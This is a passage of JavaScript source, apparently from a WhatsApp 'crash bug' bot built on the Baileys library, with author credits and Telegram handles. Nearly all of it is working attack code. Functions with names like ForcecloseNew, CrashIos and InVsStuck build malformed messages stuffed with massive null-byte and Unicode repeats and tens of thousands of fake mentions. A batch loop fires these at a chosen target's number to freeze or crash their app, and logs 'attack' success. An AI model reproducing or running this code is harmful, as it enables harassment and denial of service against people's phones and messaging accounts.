                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "N3xith 🍷"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statuSerentributionType: 2
        }
    };
  

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Aii.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Aii.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Nice Try" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function MaxInVsDelay(Aii, durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000;
    const startTime = Date.now();
    let count = 0;
    let batch = 0;
    const maxBatch = 5; // jumlah batch maksimal

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch >= maxBatch) {
            console.log(`🛑 Stopped after sending ${batch} batch(es)`);
            return;
        }

        try {
            if (count < 50) {
                await Promise.all([
                  CosmoApiDelay(Aii, X),
                  sleep(2000),
                  restart(Ren, X)
                ]);
console.log(chalk.hex('#00BFFF')(`
─────────────────────
   ♦️ SEND : ${count + 1}/50
─────────────────────`));
                count++;
                setTimeout(sendNext, 100);
            } else {
console.log(chalk.green(`
┌──────────────────────────────────┐
│ ${chalk.green.bold('✅ Success Sending 50 Messages')}   │
└──────────────────────────────────┘`));
console.log(chalk.hex('#87CEEB')(`✅ Success Sending 50 Messages to ${X}`));
                count = 0;
                batch++;
                if (batch < maxBatch) {
console.log(chalk.green(`
┌────────────────────┐
│ ➡️ Next Batch ${batch + 1}/${maxBatch}   │
└────────────────────┘`));
                    setTimeout(sendNext, 100);
                } else {
console.log(chalk.green.bold(`
┌────────────────────────────┐
│ 🧬 Finished all ${maxBatch} batches.  │
└────────────────────────────┘`));
                }
            }
        } catch (error) {
            console.error(`❌ Error saat mengirim: ${error.message}`);
            setTimeout(sendNext, 100);
        }
    };

    sendNext();
}
//=========================//

async function AlbumDelayInvis(Aii, X, mention) {
const generateMessage = {
                 viewOnceMessage: {
                      message: {
                           imageMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                                mimetype: "image/jpeg",
         fileSha256: "ArKOYTBAMkcGtAUmIpsHrpUc+h2Em3KwISGMlK4JGcw=",
         fileLength: "46825",
         height: 720,
         width: 720,
         caption: '𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 #🇧🇳' + "\u0000".repeat(1000),
         mediaKey: "msJsyD7Snd52+I4zICUo99JmTkF/n5V55Y3WWd8XRIM=",
         fileEncSha256: "+sCpmRVDqzNaA66fi7IIBxXSaBBKGBakhxl2HvbtDlg=",
         directPath: "/o1/v/t24/f2/m232/AQMkFEuGZ3bLV_dvXmUkZyC0tlj9GEEiS8L5K22Rr9J1w9JbP3j3dsoklN8xBrfq9A-0Yyav-xEoQ80GdbB_jW0bFYv7NndRrMNbCOnFJQ?ccb=9-4&oh=01_Q5Aa1gF3ITej8qDqlRKeHSH7VWOjyHENodEiPoORt3Elspt0Vw&oe=684FF617&_nc_sid=e6ed6c",
         mediaKeyTimestamp: "1747370714",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAtAAACAwEBAAAAAAAAAAAAAAAAAwECBAUGAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAA8yAS1Tx1L541VvY5xBUEhGnM4Ze9IZXXzRBYqgSGvG49EVzS8zKFgADV7Rc9bmx1eb2vMKuG1soAM2AI7AQrjATAVcA//8QAJhAAAgIBAwMEAwEAAAAAAAAAAQIAAxEEEjETIFEFECFhFDJScf/aAAgBAQABPwD3SMuBkxFUj7mMAfctBNOPBgJ7KsAy0xSQ0rIM1JCIB57ascx2HmaUVtaN/ErUdVgOMzX/ABYo7aU3viPo225ENBUDE6a0vk+JfZ1XzD2aPHViKSIKVBNj/qs1Gpa128Z7qW2sDiU3lsApiepakheknaF+ZdThFcCVCsbdxxNPttYBMkDkzVuHst/3sHIlaAkRkr/GdWI4mm0b3sP5lmzR6VgkLE5gxwYygcH2qXdYo8mXhqWwsS13YbjNHcKnCHhp6rdlhX7mWAbFn//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
         scansSidecar: "mT6PclRYEv3tp8a6nKTC0uB7M94FIGDQqPzbxB9yVs1zMc44G0c6OA==",
         scanLengths: [4507, 12015, 9555, 20748],
         midQualityFileSha256: "UPPqsUjGTnZun7b34iuS9S0vjmHC3jm3wvakBMHkIw4=",
                                contextInfo: {
                                mentionedJid: Array.from({
               length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                                isSampled: true,
                                participant: X,
                                remoteJid: "status@broadcast",
                                forwardingScore: 9741,
                                isForwarded: true
                           }
                      }
                 }
            }
       };
       
       const msg = generateWAMessageFromContent(X, generateMessage, {});

       await Aii.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [X],
            additionalNodes: [
                 {
                      tag: "meta",
                      attrs: {},
                      content: [
                           {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                     {
                                          tag: "to",
                                          attrs: { jid: X },
                                          content: undefined
                                     }
                                ]
                           }
                      ] 
                 }
            ]  
       });
      
       if (mention) {
            await Aii.relayMessage(
                 X,
                      {
                           statusMentionMessage: {
                                message: {
                                     protocolMessage: {
                                          key: msg.key,
                                          type: 25
                                     }
                                }
                           }
                      },{
                           additionalNodes: [
                                {
                                     tag: "meta",
                                     attrs: { is_status_mention: "𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 #🇧🇳" },
                                     content: undefined
                                }
                           ]
                      }
                 );
            }
       }

async function InVsStuck(Aii, X, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(X, message, {});

  await Aii.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function ComboXSticker(Aii, target) {
    const MSG = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "\u0007".repeat(30000),
                    previewType: "ꦽ".repeat(10200),
                    contextInfo: {
                        mentionedJid: [
                            target,
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 30000 },
                                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Aii.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await Aii.relayMessage(
        target,
        {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 #🇧🇳" },
                    content: undefined
                }
            ]
        }
    );
}

async function invisfc(Aii, target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "📟",
                    contentText:
                        "⟅ ༑ ▾𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 #🇧🇳⟅ ༑ ▾",
                    footerText: "©𝟐𝟎𝟐𝟓 AsepNotDev ༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🍷" + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await Aii.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await Aii.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "⟅ ༑ ▾𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 #🇧🇳 ༑ ▾ " },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function ForcecloseNew(sock, target) {
try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000),
              },
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "X",
              mentionedJid: ["0@s.whatsapp.net"],
            },
            body: {
              text: "PrivMess.js",
            },
            nativeFlowMessage: {
                    messageParamsJson: "{".repeat(500000),
            },
          },
        },
      },
    }, {
      participant: { jid: target },
      messageId: null,
    });   
        
    const msg2 = {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true", // Pastikan URL ini VALID
                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "Wkwk.pptx",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              contextInfo: {
                participant: target,
                remoteJid: "X",
                mentionedJid: ["6281393001103@s.whatsapp.net"],
              },
              body: {
                text: "@6281393001103".repeat(10000), // Teks yang jauh lebih pendek
              },
              nativeFlowMessage: {
                    messageParamsJson: "{}",
              },
            },
          },
        },
      },
    };
    await sock.relayMessage(target, msg2, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    console.log("Succes attack to target");
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
  }
}
//=================================//

async function AlbumsJIDS(Aii, X, mention) {
  const photo = {
    image: tdxlol,
    caption: "꙳͙͡༑𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽༑〽️"
  };

  const album = await generateWAMessageFromContent(X, {
    albumMessage: {
      expectedImageCount: 666, 
      expectedVideoCount: 0
    }
  }, {
    userJid: X,
    upload: Aii.waUploadToServer
  });

  await Aii.relayMessage(X, album.message, { messageId: album.key.id });

  for (let i = 0; i < 100; i++) { 
    const msg = await generateWAMessage(X, photo, {
      upload: Aii.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 #🇧🇳༑⃟⃟🎭",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await Aii.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: X }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await Aii.relayMessage(X, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "꙳͙͡༑𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽༑〽️" }, content: undefined }
        ]
      });
    }
  }
}

async function TrashOverProto(Aii, target, mention) {
    const photo = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
        fileLength: "98",
        height: 4,
        width: 4,
        mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
        fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
        directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
        mediaKeyTimestamp: "1749728782",
        caption: ""
    };

    let album = await generateWAMessageFromContent(target, {
        albumMessage: {
            expectedImageCount: 666 
        }
    }, {
        userJid: target,
        upload: X.waUploadToServer
    });

    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
    }));
    
    const TrashMessage = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "assalamualaikum",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    description: "Fuck Bicth!!!",
                }
            }
        }
    };

    const over = {
        body: TrashMessage,
        image: [photo],
    };

    for (let i = 0; i < 100; i++) {
        const msg = await generateWAMessage(target, over, {});
        const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

        msg.message[type].contextInfo = {
            mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardedNewsletterMessageInfo: {
                newsletterName: "Rilzz Step Back",
                newsletterJid: "0@newsletter",
                serverMessageId: 1
            },
            messageAssociation: {
                associationType: 1,
                parentMessageKey: album.key
            }
        };

        await Aii.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await Aii.relayMessage(target, {
                statusMentionMessage: {
                    message: { protocolMessage: { key: msg.key, type: 25 } }
                }
            }, {
                additionalNodes: [
                    { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
                ]
            });
        }

        console.log(chalk.green(`Send Bug Delay Force`));
    }
}
//======================================//
async function CrashIos(Aii, target) {
    await Aii.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: " 鈥硷笍鈨燄潟攫潠擆潚婐潠櫶μ攫潠嵧? 覊覉鈨濃優鈨熲儬鈨り櫚隀碴櫛\n" + "\u0000".repeat(25000) + "饝噦饝喌饝喆饝喛".repeat(60000),
          url: "https://t.me/GizzyyOffc",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "饝噦饝喌饝喆饝喛".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: " 鈥硷笍鈨燄潟锯儼谭饾枔饾拪饾枡苔叹蛨蛨蛨蛨饾枍廷 覊覉鈨濃優鈨熲儬鈨り櫚隀碴櫛" + "饝噦饝喌饝喆饝喛".repeat(60000),
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
  }        

async function InVsSwIphone(Aii, X) {
        	try {
        		const locationMessage = {
        			degreesLatitude: -9.09999262999,
        			degreesLongitude: 199.99963118999,
        			jpegThumbnail: null,
        			name: "𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 🐉" + "꙳͙͡༑𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽༑〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
        			address: "𖣂 ᳟༑ᜌ ̬  .....   ͠⤻𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽  ⃜    ⃟༑" + "𖣂 ᳟༑ᜌ ̬  .....   ͠⤻𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽  ⃜    ⃟༑" + "𑇂𑆵𑆴𑆿".repeat(5000),
        			url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        		}
        		
        		const msg = generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: { locationMessage }
                    }
                }, {});
        		
        		await Aii.relayMessage('status@broadcast', msg.message, {
        			messageId: msg.key.id,
        			statusJidList: [X],
        			additionalNodes: [{
        				tag: 'meta',
        				attrs: {},
        				content: [{
        					tag: 'mentioned_users',
        					attrs: {},
        					content: [{
        						tag: 'to',
        						attrs: { jid: X },
        						content: undefined
        					}]
        				}]
        			}]
        		});
        	} catch (err) {
        		console.error(err);
        	}
        };
        
        async function iNvsExTendIos(Aii, X) {
        	try {
        		const extendedTextMessage = {
        			text: `𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 🐉 \n\n 🫀 creditos : t.me/asepnotdev ` + CrLxTrava + LagHomeTravas,
        			matchedText: "https://t.me/whiletry",
        			description: "𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽🎭" + "𑇂𑆵𑆴𑆿".repeat(150),
        			title: "𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
        			previewType: "NONE",
        			jpegThumbnail: "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